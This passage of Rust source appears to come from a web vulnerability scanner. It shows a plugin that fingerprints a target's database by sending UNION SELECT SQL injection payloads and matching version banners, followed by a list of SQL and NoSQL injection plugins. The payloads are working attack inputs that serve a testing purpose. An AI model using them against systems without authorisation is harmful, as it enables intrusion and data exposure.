        // Strong, product-specific banners only — never bare version fragments
        // like "3." or "8." that match dates, prices, and unrelated version
        // strings. A match must also be new relative to the baseline.
        let fingerprints: &[(&str, DbType, &[&str])] = &[
            (
                "' UNION SELECT @@version,NULL-- -",
                DbType::MySQL,
                &["mysql community server", "-mariadb", "mariadb server"],
            ),
            (
                "' UNION SELECT version(),NULL-- -",
                DbType::PostgreSQL,
                &["postgresql 1", "postgresql 9", "postgresql on x86"],
            ),
            (
                "' UNION SELECT @@version,NULL-- -",
                DbType::Mssql,
                &["microsoft sql server 20", "sql server (rtm)"],
            ),
            (
                "' UNION SELECT banner,NULL FROM v$version-- -",
                DbType::Oracle,
                &[
                    "oracle database 1",
                    "oracle database 2",
                    "oracle database 11g",
                ],
            ),
            (
                "' UNION SELECT sqlite_version(),NULL-- -",
                DbType::SQLite,
                &["sqlite version 3", "sqlite 3."],
            ),
        ];

        let Some(baseline) = crate::verify::Baseline::fetch(client, &target.url).await else {
            return vec![];
        };

        for (payload, db, signatures) in fingerprints {
            let variants = build_injection_urls_adv(target, payload);
            for (param, url) in variants {
                if let Some((_, body)) = get_body(client, &url).await {
                    let bl = body.to_lowercase();
                    for sig in *signatures {
                        if crate::verify::signature_is_new(&baseline.body_lower, &bl, sig) {
                            return vec![
                                Finding::new(
                                    format!("Database Fingerprinted — {}", db),
                                    Severity::Medium,
                                    &target.url,
                                    format!(
                                        "The database version was identified as {} via SQL injection. Version information aids targeted exploitation.",
                                        db
                                    ),
                                    "Suppress all database error output and version information in production responses.",
                                    "active/sqli-fingerprint",
                                )
                                .with_parameter(&param)
                                .with_evidence(format!(
                                    "DB: {} — banner `{}` (new vs baseline) via payload `{}`",
                                    db, sig, &payload[..payload.len().min(80)]
                                ))
                                .with_cwe(200)
                                .with_owasp("A05:2021 – Security Misconfiguration")
                                .confirmed(),
                            ];
                        }
                    }
                }
            }
        }
        vec![]
    }
}

/// All advanced SQLi plugins ready to merge into `ActiveScanner::new`.
pub fn plugins() -> Vec<Box<dyn ScanPlugin>> {
    vec![
        Box::new(SqliErrorPlugin),
        Box::new(SqliBooleanPlugin),
        Box::new(SqliTimePlugin),
        Box::new(SqliUnionPlugin),
        Box::new(SqliStackedPlugin),
        Box::new(SqliOobPlugin),
        Box::new(SqliSecondOrderPlugin),
        Box::new(SqliWafBypassPlugin),
        Box::new(NoSqlInjectionPlugin),
        Box::new(SqliFingerprintPlugin),
    ]
}
